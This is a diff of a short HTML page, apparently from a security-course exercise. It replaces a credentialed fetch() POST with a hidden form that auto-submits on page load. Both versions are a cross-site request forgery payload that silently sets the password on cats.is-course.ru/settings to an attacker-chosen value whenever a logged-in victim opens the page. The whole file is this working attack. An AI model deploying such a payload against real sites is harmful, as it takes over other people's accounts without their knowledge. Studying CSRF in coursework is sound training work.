@@ -1,15 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <form id="catsForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="aaaaaaaaaaaaaaaa2_SP">
+        <input type="hidden" name="confirm-password" value="aaaaaaaaaaaaaaaa2_SP">
+    </form>
+
     <script>
-        fetch('https://cats.is-course.ru/settings', {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: 'password=aaaaaaaaaaaaaaaa2_SP&confirm-password=aaaaaaaaaaaaaaaa2_SP'
-        });
+        document.getElementById('catsForm').submit();
     </script>
 </body>
 </html>
